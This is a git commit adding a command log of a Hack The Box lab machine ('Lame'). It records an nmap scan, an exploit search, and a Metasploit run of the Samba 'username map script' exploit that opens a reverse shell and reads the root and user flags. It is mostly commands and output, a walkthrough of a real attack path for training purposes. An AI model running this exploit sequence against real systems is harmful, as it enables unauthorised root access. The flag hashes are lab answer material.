a4b83eea8769ff48628e27eb50ec75e9fe9295df
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-04-01 18:05:57 -0400

    Create asAScriptKiddie.bash

---
+++ Lame/asAScriptKiddie.bash
@@ -0,0 +1,179 @@
+$ nmap -sV -sC -Pn 10.10.10.3 -oA nmap_scan
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-01 17:14 EDT
+Nmap scan report for 10.10.10.3
+Host is up (0.023s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.21
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 4h02m57s, deviation: 0s, median: 4h02m57s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-04-01T17:17:26-04:00
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.54 seconds
+
+// We have ports open on FTP, ssh, and Samba
+// We can check if the first service is vulnerable by copying it (vsftpd 2.3.4) and using searchsploit
+// After significant struggles of downloading git and setting the searchsploit tools correctly it worked as intended
+
+$ searchsploit vsftpd 2.3.4
+[i] Found (#2): /opt/exploit-database/files_exploits.csv
+[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)
+
+[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
+[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)
+
+---------------------------------------------------------------------------------------------------------- -----------------------------------------
+ Exploit Title                                                                                            |  Path
+                                                                                                          | (/opt/exploit-database/)
+---------------------------------------------------------------------------------------------------------- -----------------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                    | exploits/unix/remote/17491.rb
+---------------------------------------------------------------------------------------------------------- -----------------------------------------
+Shellcodes: No Result
+
+// Had to install metasploit
+
+$ mfsconsole
+msf5 > search samba 3.0.20
+
+Matching Modules
+================
+
+   #   Name                                                   Disclosure Date  Rank       Check  Description
+   -   ----                                                   ---------------  ----       -----  -----------
+   0   auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
+   1   auxiliary/admin/smb/samba_symlink_traversal                             normal     No     Samba Symlink Directory Traversal
+   2   auxiliary/dos/samba/lsa_addprivs_heap                                   normal     No     Samba lsa_io_privilege_set Heap Overflow
+   3   auxiliary/dos/samba/lsa_transnames_heap                                 normal     No     Samba lsa_io_trans_names Heap Overflow
+   4   auxiliary/dos/samba/read_nttrans_ea_list                                normal     No     Samba read_nttrans_ea_list Integer Overflow
+   5   auxiliary/scanner/rsync/modules_list                                    normal     No     List Rsync Modules
+   6   auxiliary/scanner/smb/smb_uninit_cred                                   normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   7   exploit/freebsd/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
+   8   exploit/linux/samba/chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   9   exploit/linux/samba/is_known_pipename                  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+   10  exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   11  exploit/linux/samba/setinfopolicy_heap                 2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   12  exploit/linux/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
+   13  exploit/multi/samba/nttrans                            2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
+   14  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
+   15  exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   16  exploit/osx/samba/trans2open                           2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
+   17  exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   18  exploit/solaris/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
+   19  exploit/unix/http/quest_kace_systems_management_rce    2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
+   20  exploit/unix/misc/distcc_exec                          2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+   21  exploit/unix/webapp/citrix_access_gateway_exec         2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
+   22  exploit/windows/fileformat/ms14_060_sandworm           2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
+   23  exploit/windows/http/sambar6_search_results            2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
+   24  exploit/windows/license/calicclnt_getconfig            2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
+   25  exploit/windows/smb/group_policy_startup               2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
+   26  post/linux/gather/enum_configs                                          normal     No     Linux Gather Configurations
+
+
+msf5 > use exploit/multi/samba/usermap_script
+msf5 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
+RHOST => 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP double handler on 10.10.14.21:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo eDklkMEVGjxmnQEa;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "eDklkMEVGjxmnQEa\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.14.21:4444 -> 10.10.10.3:37541) at 2020-04-01 18:00:03 -0400
+
+whoami
+root
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+cd home
+ls
+ftp
+makis
+service
+user
+cd makis
+ls
+user.txt
+cat user.txt
+69454a937d94f5f0225ea00acd2e84c5
+cat root/root.txt
+cat: root/root.txt: No such file or directory
+cd ..
+whoami
+root
+cat /root/root.txt
+92caac3be140ef409e45721348a4e9df
+
+                  
